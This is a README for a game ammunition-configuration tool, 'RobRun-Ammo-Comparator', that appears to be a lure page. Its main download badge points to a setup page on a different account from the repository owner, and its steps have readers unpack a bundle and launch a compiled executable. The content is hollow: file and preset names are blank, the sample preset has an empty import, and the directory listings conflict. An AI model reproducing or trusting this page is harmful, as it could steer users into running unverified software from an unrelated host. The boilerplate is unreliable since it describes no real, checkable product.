RobRun-Ammo-Comparator:

# RobRun-Ammo-Comparator

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-65a30d?style=flat&logo=checkmarx&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/TigerProxy78/RobRun-Ammo-Comparator/actions/workflows/ci.yml">
    <img src="https://img.shields.io/badge/Build-Status-success?style=for-the-badge&color=brightgreen&logo=github" alt="Build Status">
  </a>
  <a href="https://github.com/TigerProxy78/RobRun-Ammo-Comparator/wiki">
    <img src="https://img.shields.io/badge/Docs-Ready-blue?style=flat-square&logo=readthedocs" alt="Documentation">
  </a>
  <a href="https://github.com/TigerProxy78/RobRun-Ammo-Comparator/releases/tag/v1.0.0">
    <img src="https://img.shields.io/badge/Version-1.0.0-orange?style=plastic&logo=gitlab" alt="Version">
  </a>
  <a href="https://github.com/TigerProxy78/RobRun-Ammo-Comparator/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-lightgrey?style=flat&logo=creativecommons" alt="License">
  </a>
  <a href="https://github.com/TigerProxy78/RobRun-Ammo-Comparator">
    <img src="https://img.shields.io/badge/Last-Updated-2026-purple?style=for-the-badge&logo=calendar" alt="Last Updated">
  </a>
</div>

---

## Overview

RobRun-Ammo-Comparator is a structured configuration and comparison engine designed for the RobRun series. It offers a curated set of profile bundles and workflow presets that enable players to fine‑tune ammunition handling, reload timing, and projectile behavior with minimal effort. The repository ships a complete release bundle containing all necessary assets and an intuitive visual configuration interface that works seamlessly with the RobRun Manager.

---

## Features

- **Profile Bundles** – Three ready‑made bundles (`Standard`, `Balanced`, `Aggressive`) that cover the most common gameplay scenarios.
- **Customizable Presets** – Each preset can be tweaked on a per‑profile basis, allowing for precise control over reload speed, ammo consumption, and projectile spread.
- **Visual Editor** – A lightweight, cross‑platform editor that renders configuration changes in real time, eliminating guesswork.
- **Compatibility** – All configuration files are fully compatible with the latest version of RobRun Manager and the RobRun Companion.
- **Documentation** – An extensive knowledge base and inline help inside the editor make learning the system straightforward.

---

## Presets

Preset configurations are grouped under the `presets` directory. Each preset is a simple text file that imports the default bundle and applies a set of overrides:

- `` – A mid‑range profile that balances fire‑rate with accuracy.
- `` – Maximizes projectile output at the expense of reload efficiency.
- `` – A conservative baseline for new players.

Preset files contain comments and placeholders that the editor can interpret, making it trivial to adjust values on the fly. For example:

```
#
import
ammo_limit = 120
reload_time = 1.8
projectile_speed = 650
```

---

## Usage

1. **Download** the latest release bundle using the button above or directly from the releases page.
2. **Unpack** the ZIP file into a folder of your choice.
3. **Launch** the visual editor located in the `utility` directory.
4. **Open** a preset file (e.g., ``) through the editor’s file picker.
5. **Adjust** the parameters using the on‑screen controls. Changes are applied instantly to the preview pane.
6. **Export** the updated configuration back to the `config` folder.
7. **Reload** RobRun Manager to apply the new settings.

The editor automatically validates all numeric values and will flag any out‑of‑range entries. Once exported, the files are ready for use with no additional steps.

---

## Directory Structure

```
RobRun-Ammo-Comparator/
├─ config/
│  ├─
│  ├─
│  ├─
│  └─
├─ presets/
│  ├─
│  ├─
│  └─
├─ utility/
│  └─ Release
├─ docs/
│  └─ user_manual.pdf
└─ README.md
```

This layout keeps all core assets isolated, simplifying backup and version control. The `utility` directory contains the compiled editor executable for both Windows and macOS.

---

## FAQ

**Q: Can I use my own custom profile names?**
A: Yes. Create a new `.cfg` file in the `config` folder and reference it from the editor. The system treats any valid `.cfg` file as a profile.

**Q: How do I revert to the original settings?**
A: Delete or rename ``. The editor will fall back to `` automatically.

**Q: Does this affect gameplay speed or frame rates?**
A: No. All changes are purely configuration‑level and have no impact on the engine’s performance.

**Q: I see an error after exporting a preset. What’s wrong?**
A: The editor will highlight syntax errors in red. Common issues include missing commas, invalid numeric formats, or referencing undefined variables. Correct the highlighted lines and re‑export.

**Q: Where can I find advanced documentation?**
A: The `docs` directory contains a PDF guide that covers all advanced topics, including scripting hooks and API usage.

---

## Support & Contributions

For bug reports or feature requests, open an issue in the GitHub tracker. Contributions are welcome – please fork the repository, create a feature branch, and submit a pull request. All changes should be accompanied by unit tests and updated documentation where applicable.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```